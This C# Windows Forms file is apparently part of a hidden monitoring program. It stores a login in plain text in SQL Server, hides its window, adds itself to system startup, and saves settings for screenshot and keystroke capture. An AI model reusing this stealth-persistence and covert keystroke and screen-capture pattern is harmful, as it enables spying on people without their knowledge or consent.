using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HideFormProgram
{
    public partial class GetIDAndPassword : Form
    {
        SqlConnection conn = new SqlConnection();
        string connectionString = "Data Source=HAIER-PC;Initial Catalog=myproject;Integrated Security=True";
        public GetIDAndPassword()
        {
            conn.ConnectionString = connectionString;
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            string Username = textBox1.Text.ToString();
            string password = textBox2.Text.ToString();
            if (string.IsNullOrEmpty(Username))
                MessageBox.Show("Enter Username");
            if (string.IsNullOrEmpty(password))
                MessageBox.Show("Enter Password");
            if (!string.IsNullOrEmpty(Username) && !string.IsNullOrEmpty(password))
            {
                try
                {
                    conn.Open();
                    string query = "insert into LoginForm(userName,password) values(@name,@pass)";
                    SqlCommand cmd = new SqlCommand(query, conn);
                    cmd.Parameters.AddWithValue("@name", Username);
                    cmd.Parameters.AddWithValue("@pass", password);
                    int row = cmd.ExecuteNonQuery();
                    conn.Close();
                    
                    //  after insert check 
                    
                    if (row == 1)
                    {
                        this.Hide();
                        Debug.WriteLine("Insert Successfully");
                        bool install = addApplicationInStartUp.RunOnStartUp();
                        if (install == true)
                        {
                            MessageBox.Show("Successfully Installed\nRestart your System.", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            MenuForm form = new MenuForm();
                            string[] data = form.getSetting();
                            if (data.Length > 0)
                            {
                                if (data[0] != null && data[1] != null && data[2] != null && data[3] != null && data[4] != null)
                                {
                                    conn.Open();
                                    string query1 = "insert into Settings(ScreenShotStatus,keyTypedStatus,snapShotInterval,DeleteSnapShot,DeleteOtherData,Daat,Time) values(@sStatus,@kStatus,@Interval,@DeleteSnap,@DeleteOther,@date,@time)";
                                    SqlCommand cmd1 = new SqlCommand(query1, conn);
                                    cmd1.Parameters.AddWithValue("@sStatus", data[0]);
                                    cmd1.Parameters.AddWithValue("@kStatus", data[1]);
                                    cmd1.Parameters.AddWithValue("@Interval", data[2]);
                                    cmd1.Parameters.AddWithValue("@DeleteSnap", data[3]);
                                    cmd1.Parameters.AddWithValue("@DeleteOther", data[4]);
                                    cmd1.Parameters.AddWithValue("@date", DateTime.Now.ToString("d"));
                                    cmd1.Parameters.AddWithValue("@time", DateTime.Now.ToString("HH:mm:ss"));
                                    int row1 = cmd1.ExecuteNonQuery();
                                    if (row1 == 1)
                                        Debug.WriteLine("Successfully Submited");
                                    // MessageBox.Show("Successfully Submited");
                                    else
                                        Debug.WriteLine("Not Insert Successfully");
                                   // MessageBox.Show("Not Insert Successfully");

                                    conn.Close();
                                }
                            }
                        }
                        else
                        {
                            MessageBox.Show("Not Installed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    else
                    {
                        MessageBox.Show("Some Error");
                    }
                }
                catch(Exception ex) { Debug.WriteLine("Error\n"+ex); }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Application.Exit();
        }

        private void GetIDAndPassword_Load(object sender, EventArgs e)
        {

        }
    }
}
